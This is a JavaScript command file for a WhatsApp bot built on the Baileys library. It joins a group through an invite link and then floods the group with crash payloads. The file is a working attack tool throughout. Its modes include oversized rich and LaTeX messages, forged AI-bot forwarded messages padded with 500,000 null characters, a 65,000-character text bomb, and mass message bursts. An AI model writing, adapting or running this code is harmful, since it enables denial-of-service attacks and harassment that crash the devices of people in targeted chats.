import { AIRich } from "@whiskeysockets/baileys";

export default {
  name: ["crash"],
  description: "Entra a un grupo por enlace y lo traba",
  category: "owner",
  ownerOnly: true,

  async run({ sock, from, text, cmdName, reply }) {
    if (!text || !text.includes("whatsapp.com")) {
      return reply({
        text:
          `💥 Pásame el enlace del grupo a crashear.\n` +
          `Ej: .${cmdName} https://chat.whatsapp.com/XXXX rich\n\n` +
          `Modos: rich | latex | nulls | combo | rafaga | text`,
      });
    }

    const match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i);
    if (!match) return reply({ text: "😡 Enlace inválido." });
    const code = match[1];

    // modo = segunda palabra después del link
    const modo = (text.split(/\s+/)[1] || "rich").toLowerCase();

    let groupId;
    try {
      groupId = (await sock.groupGetInviteInfo(code)).id;
    } catch {
      return reply({ text: "⚠️ No pude leer el grupo. Enlace inválido o expirado." });
    }

    try {
      await sock.groupAcceptInvite(code);
    } catch {}

    await reply({ text: `🧪 Crasheando ${groupId} → modo *${modo}*` });

    // ---------- RICH BOMB ----------
    if (modo === "rich") {
      const rich = new AIRich(sock);
      rich.setTitle("💥 CRASH");
      for (let i = 0; i < 300; i++) {
        rich.addText(`Item ${i} [link](https://x.com) [](https://y.com) $x^2$`);
      }
      rich.addSuggest(["a","b","c","d","e","f","g","h","i","j"]);
      rich.setFooter("boom 💀");
      await rich.send(groupId);
      return reply({ text: "✅ rich enviado." });
    }

    // ---------- LATEX BOMB ----------
    if (modo === "latex") {
      const rich = new AIRich(sock);
      rich.setTitle("∫ CRASH ∫");
      for (let i = 0; i < 300; i++) {
        rich.addText(`$\\int_{0}^{\\infty} e^{-x^2} dx = \\frac{\\sqrt{\\pi}}{2}$`);
      }
      await rich.send(groupId);
      return reply({ text: "✅ latex enviado." });
    }

    // ---------- NULLS ----------
    if (modo === "nulls") {
      const annotations = "\u0000".repeat(500000);
      const payload = {
        botForwardedMessage: {
          message: {
            richResponseMessage: {
              messageType: 0,
              submessages: [{ messageType: 7, mapMetadata: { annotations } }],
              contextInfo: {
                forwardingScore: 1,
                isForwarded: true,
                forwardOrigin: 4,
                forwardedAiBotMessageInfo: { botJid: "0@bot" },
              },
            },
          },
        },
      };
      for (let i = 0; i < 30; i++) {
        try { await sock.relayMessage(groupId, payload, {}); } catch {}
        await new Promise((r) => setTimeout(r, 1200));
      }
      return reply({ text: "✅ nulls enviados." });
    }

    // ---------- RÁFAGA ----------
    if (modo === "rafaga") {
      const n = parseInt(text.split(/\s+/)[2]) || 200;
      const promesas = [];
      for (let i = 0; i < n; i++) {
        promesas.push(sock.sendMessage(groupId, { text: `💣 ${i + 1}/${n}` }));
      }
      await Promise.allSettled(promesas);
      return reply({ text: `✅ ráfaga de ${n} enviada.` });
    }

    // ---------- TEXT BOMB ----------
    if (modo === "text") {
      await sock.sendMessage(groupId, { text: "A".repeat(65000) });
      return reply({ text: "✅ text bomb enviado." });
    }

    // ---------- COMBO TOTAL ----------
    if (modo === "combo") {
      const rich = new AIRich(sock);
      rich.setTitle("COMBO");
      for (let i = 0; i < 150; i++) {
        rich.addText(`Item ${i} [x](https://x.com) $x^2$`);
      }
      await rich.send(groupId);

      const annotations = "\u0000".repeat(500000);
      const payload = {
        botForwardedMessage: {
          message: {
            richResponseMessage: {
              messageType: 0,
              submessages: [{ messageType: 7, mapMetadata: { annotations } }],
              contextInfo: {
                forwardingScore: 1,
                isForwarded: true,
                forwardOrigin: 4,
                forwardedAiBotMessageInfo: { botJid: "0@bot" },
              },
            },
          },
        },
      };
      for (let i = 0; i < 10; i++) {
        try { await sock.relayMessage(groupId, payload, {}); } catch {}
        await new Promise((r) => setTimeout(r, 800));
      }

      const promesas = [];
      for (let i = 0; i < 150; i++) {
        promesas.push(sock.sendMessage(groupId, { text: `💣 ${i + 1}/150` }));
      }
      await Promise.allSettled(promesas);

      return reply({ text: "✅ combo terminado." });
    }

    return reply({ text: `Modo desconocido: *${modo}*` });
  },
};